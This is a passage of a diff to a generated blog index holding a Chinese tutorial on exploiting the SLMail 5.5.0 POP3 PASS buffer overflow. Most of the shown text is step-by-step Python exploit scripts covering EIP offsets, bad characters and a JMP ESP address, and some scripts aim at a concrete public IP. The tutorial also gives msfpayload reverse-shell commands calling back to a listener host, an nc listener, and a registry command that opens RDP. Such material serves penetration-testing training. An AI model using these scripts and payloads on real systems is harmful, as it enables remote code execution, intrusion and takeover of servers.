class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=</span><br><span class="line"><span class="string">'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p><code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 39694438</code>    #计算EIP寄存器内存地址ASCII码在2700唯一字符串中的偏移量</p><blockquote><h4 id="python代码05-py"><a href="#python代码05-py" class="headerlink" title="python代码05.py"></a>python代码<code>05.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*<span class="number">20</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>思路:<br>将EIP修改为shellcode代码的内存地址,将shellcode写入到该地址空间,程序读取EIP寄存器数值,将跳转到shellcode代码段并执行；<br>寻找可存放shellcode的内存空间</p><blockquote><h4 id="python代码06-py"><a href="#python代码06-py" class="headerlink" title="python代码06.py"></a>python代码<code>06.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+<span class="string">"C"</span>*(<span class="number">3500</span><span class="number">-2606</span><span class="number">-4</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>不同类型的程序,协议,漏洞,会将某些字符认为是坏字符,这些字符有固定用途<br>    返回地址,Shellcode,buffer中都不能出现坏字符<br>    null byte (0x00) 空字符,用于终止字符串的拷贝操作<br>    return (0x0D)回车操作,表示POP3 PASS命令输入完成<br>    思路:发送0x00—-0xff 256个字符,查找所有坏字符<br>    00000000 11111111 256 #二进制</p><blockquote><h4 id="python代码07-py"><a href="#python代码07-py" class="headerlink" title="python代码07.py"></a>python代码<code>07.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span></span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span></span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span></span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span></span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span></span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span></span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span></span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span></span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span></span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span></span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span></span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span></span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span></span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span></span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span></span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"B"</span>*<span class="number">4</span>+badchars</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><pre><code>0x0A    0x0D    0x00    #坏字符</code></pre><p>重定向数据流<br>    用ESP的地址替换EIP的值<br>    但是ESP地址变化,硬编码不可行<br>    SLMaail线程应用程序,操作系统为每个线程分配一段地址范围,每个线程地址范围不确定<br>变通思路<br>    在内存中寻找地址固定的系统模块<br>    在模块中寻找JMP ESP 指令的地址跳转,再由该指令间接跳转到ESP,从而执行shellcode<br>    mona.py脚本识别内存模块,搜索”return address”是JMP ESP指令的模块<br>    寻找无DEP,ALSR保护的内存地址<br>    内存地址不包含坏字符<br>    寻找不受保护的系统模块<br>        !mona modules<br>    将汇编指令jmp esp 转换为二进制<br>        <code>/usr/share/metasploit-framework/tools/exploit/masm_shell.rb</code><br>        FFE4<br>    在模块中搜索FFE4指令<br>    <code>!mona find -s &quot;\xff\xe4&quot; -m slmfc.dll</code><br>        选择不包含坏字符的内存地址<br>    在该地址设置断点<br>    重发buffer</p><blockquote><h4 id="python代码08-py-地址全翻转"><a href="#python代码08-py-地址全翻转" class="headerlink" title="python代码08.py(地址全翻转)"></a>python代码<code>08.py</code>(地址全翻转)</h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"C"</span>*<span class="number">390</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'1.1.1.1'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h4></blockquote><p><code>Scratch</code>        #写shellcode的工具</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;msfpayload -l</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 C</span><br><span class="line">.&#x2F;msfpayload win32_reverse lhost&#x3D;1.1.1.1 lport&#x3D;443 R | .&#x2F;msfencode -b &quot;\x00\x0a\x0d&quot;</span><br><span class="line">nc -vip 443</span><br></pre></td></tr></table></figure><blockquote><h4 id="python代码09-py"><a href="#python代码09-py" class="headerlink" title="python代码09.py"></a>python代码<code>09.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">shellcode=(</span><br><span class="line"><span class="string">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10"</span>+</span><br><span class="line"><span class="string">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F\x20"</span>+</span><br><span class="line"><span class="string">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2A\x2B\x2C\x2D\x2E\x2F\x30"</span>+</span><br><span class="line"><span class="string">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3A\x3B\x3C\x3D\x3E\x3F\x40"</span>+</span><br><span class="line"><span class="string">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50"</span>+</span><br><span class="line"><span class="string">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x5B\x5C\x5D\x5E\x5F\x60"</span>+</span><br><span class="line"><span class="string">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70"</span>+</span><br><span class="line"><span class="string">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x7B\x7C\x7D\x7E\x7F\x80"</span>+</span><br><span class="line"><span class="string">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8A\x8B\x8C\x8D\x8E\x8F\x90"</span>+</span><br><span class="line"><span class="string">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9A\x9B\x9C\x9D\x9E\x9F\xA0"</span>+</span><br><span class="line"><span class="string">"\xA1\xA2\xA3\xA4\xA5\xA6\xA7\xA8\xA9\xAA\xAB\xAC\xAD\xAE\xAF\xB0"</span>+</span><br><span class="line"><span class="string">"\xB1\xB2\xB3\xB4\xB5\xB6\xB7\xB8\xB9\xBA\xBB\xBC\xBD\xBE\xBF\xC0"</span>+</span><br><span class="line"><span class="string">"\xC1\xC2\xC3\xC4\xC5\xC6\xC7\xC8\xC9\xCA\xCB\xCC\xCD\xCE\xCF\xD0"</span>+</span><br><span class="line"><span class="string">"\xD1\xD2\xD3\xD4\xD5\xD6\xD7\xD8\xD9\xDA\xDB\xDC\xDD\xDE\xDF\xE0"</span>+</span><br><span class="line"><span class="string">"\xE1\xE2\xE3\xE4\xE5\xE6\xE7\xE8\xE9\xEA\xEB\xEC\xED\xEE\xEF\xF0"</span>+</span><br><span class="line"><span class="string">"\xF1\xF2\xF3\xF4\xF5\xF6\xF7\xF8\xF9\xFA\xFB\xFC\xFD\xFE\xFF\x00"</span>)</span><br><span class="line"></span><br><span class="line">buffer=<span class="string">"A"</span>*<span class="number">2606</span>+<span class="string">"\xe3\x41\x4b\x5f"</span>+<span class="string">"\x90"</span>*<span class="number">8</span>+shellcode</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">print</span><span class="string">"\nSending evil buffer..."</span></span><br><span class="line">s.connect((<span class="string">'107.191.43.139'</span>,<span class="number">110</span>))</span><br><span class="line">date=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'USER test'</span>+<span class="string">'\r\n'</span>)</span><br><span class="line">data=s.recv(<span class="number">1024</span>)</span><br><span class="line">s.send(<span class="string">'PASS '</span>+buffer+<span class="string">'\r\n'</span>)</span><br><span class="line">s.close()</span><br><span class="line"><span class="keyword">print</span> <span class="string">"\nDone!"</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Could not connect to POP3!"</span></span><br></pre></td></tr></table></figure><p>shellcode执行结束后以ExitProcess方式推出整个进程,将导致邮件服务崩溃；<br>Slmail是一个基于线程的应用,适用ExitThread方式可以避免整个服务崩溃,可实现重复溢出；<br><code>./msfpayload win32_reverse lhost=1.1.1.1 EXITFUNC=thread lport=443 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</code><br>    cmd注册表开启3389<br>    <code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code><br>    RegSnap #工具</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 缓冲区溢出 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> python </tag>
+            
+            <tag> 缓冲区溢出 </tag>
+            
+            <tag> 漏洞利用 </tag>
             
         </tags>
       
@@ -1385,9 +1507,9 @@
       
         <tags>
             
-            <tag> DoS攻击 </tag>
-            
             <tag> python </tag>
+            
+            <tag> DoS攻击 </tag>
             
             <tag> HULK </tag>
             
@@ -1424,13 +1546,13 @@
       
         <tags>
             
+            <tag> python </tag>
+            
             <tag> 拒绝服务攻击 </tag>
             
             <tag> DoS攻击 </tag>
             
             <tag> 缓冲区溢出 </tag>
-            
-            <tag> python </tag>
             
             <tag> Slowhttptest </tag>
             
@@ -1465,11 +1587,11 @@
             
             <tag> 拒绝服务攻击 </tag>
             
-            <tag> NTP </tag>
-            
             <tag> UDP </tag>
             
             <tag> nmap </tag>
+            
+            <tag> NTP </tag>
             
         </tags>
       
@@ -1500,11 +1622,11 @@
             
             <tag> scapy </tag>
             
+            <tag> SNMP </tag>
+            
             <tag> UDP </tag>
             
             <tag> nmap </tag>
-            
-            <tag> SNMP </tag>
             
         </tags>
       
@@ -1564,11 +1686,11 @@
       
         <tags>
             
+            <tag> python </tag>
+            
             <tag> 拒绝服务攻击 </tag>
             
             <tag> DoS攻击 </tag>
-            
-            <tag> python </tag>
             
             <tag> teardrop </tag>
             
@@ -1597,19 +1719,19 @@
       
         <tags>
             
+            <tag> python </tag>
+            
+            <tag> C </tag>
+            
             <tag> 拒绝服务攻击 </tag>
             
             <tag> scapy </tag>
             
             <tag> DoS攻击 </tag>
             
-            <tag> python </tag>
-            
             <tag> Smurf </tag>
             
             <tag> sockstress </tag>
-            
-            <tag> C </tag>
             
             <tag> TCP </tag>
             
@@ -1638,13 +1760,13 @@
       
         <tags>
             
+            <tag> python </tag>
+            
             <tag> 拒绝服务攻击 </tag>
             
             <tag> scapy </tag>
             
             <tag> DoS攻击 </tag>
-            
-            <tag> python </tag>
             
             <tag> TCP </tag>
             
@@ -1690,37 +1812,6 @@
     
     
     <entry>
-      <title>Windows缓冲区溢出测试</title>
-      <link href="/2013/08/11/pentest/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/"/>
-      <url>/2013/08/11/pentest/Windows%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%B5%8B%E8%AF%95/</url>
-      
-        <content type="html"><![CDATA[<blockquote><h4 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a><strong>缓冲区溢出</strong></h4></blockquote><p>程序漏洞从哪里来<br>    罪恶的根源:变量<br>    数据与代码边界不清<br>    最简漏洞原理—-shell脚本漏洞</p><p>当缓冲区边界限制不严格时,由于变量传入畸形数据或程序运行错误,导致缓冲区被”撑爆”,从而覆盖了相邻内存区域的数据；</p><p>成功修改内存数据,可造成进程劫持,执行恶意代码,获取服务器控制权等后果.</p><p>如何发现漏洞<br>    源码审计<br>    逆向工程<br>    模糊测试<br>        向程序堆栈半随机的数据,根据内存变化判断溢出<br>        数据生成器:生成随机,半随机数据<br>        测试工具:识别溢出漏洞</p><blockquote><h4 id="Windows缓冲区溢出"><a href="#Windows缓冲区溢出" class="headerlink" title="Windows缓冲区溢出"></a>Windows缓冲区溢出</h4></blockquote><p>FUZZER<br>SLMail 5.5.0 Mail Server<br>    POP3 PASS 命令存在缓冲区溢出漏洞<br>    无需身份验证实现远程代码执行<br>    win7++ 已升级DEP ASLR<br>        DEP:阻止代码从数据页被执行<br>        ASLR:随机内存地址加载执行程序和DLL,每次重启地址变化</p><p><code>ImmunityDebugger_1_85setup.exe</code><br><code>mana.py</code></p><p>FUZZING<br>    nc 110端口<br>    了解未知协议<br>        Wireshark<br>        RFC</p><blockquote><h4 id="python代码01-py"><a href="#python代码01-py" class="headerlink" title="python代码01.py"></a>python代码<code>01.py</code></h4></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 